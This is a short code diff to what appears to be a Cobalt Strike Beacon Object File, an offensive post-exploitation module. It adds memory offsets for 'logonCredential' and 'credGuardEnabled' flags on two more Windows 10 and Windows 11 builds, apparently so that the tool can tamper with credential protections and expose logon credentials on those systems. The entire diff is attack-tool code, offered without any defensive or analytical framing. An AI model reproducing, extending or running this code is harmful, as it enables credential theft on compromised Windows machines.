@@ -365,6 +365,14 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 		logonCredential_offSet = 0x361b4;
 		credGuardEnabled_offset = 0x35c08;
 	}
+	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 19044 && dwUBR >= 1387) { // v21H2
+		logonCredential_offSet = 0x361b4;
+		credGuardEnabled_offset = 0x35c08;
+	}
+	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 22000 && dwUBR >= 348) { // W11 v21H2
+		logonCredential_offSet = 0x3caa4;
+		credGuardEnabled_offset = 0x3cab0;
+	}
 	else {
 		BeaconPrintf(CALLBACK_ERROR, "[!] OS Version/build/revision not supported\n");
 		return;
